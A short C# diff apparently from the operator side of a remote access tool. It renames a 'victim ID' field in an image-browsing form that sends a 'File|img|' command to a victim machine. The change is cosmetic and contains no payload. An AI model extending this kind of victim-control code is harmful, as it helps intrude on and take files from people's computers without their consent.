@@ -13,7 +13,7 @@ namespace Eden
     public partial class frmFileImage : Form
     {
         public Client m_clnt;
-        public string szVictimID;
+        public string m_szVictimID;
         struct stImageItem
         {
             public string szFilename;
@@ -78,7 +78,7 @@ namespace Eden
             listView1.View = View.LargeIcon;
             listView1.LargeImageList = m_ImageList;
 
-            m_clnt.SendVictim(szVictimID, "File|img|" + Tools.EZData.OneDList2String(m_lsImgFilename));
+            m_clnt.SendVictim(m_szVictimID, "File|img|" + Tools.EZData.OneDList2String(m_lsImgFilename));
         }
 
         private void frmFileImage_Load(object sender, EventArgs e)
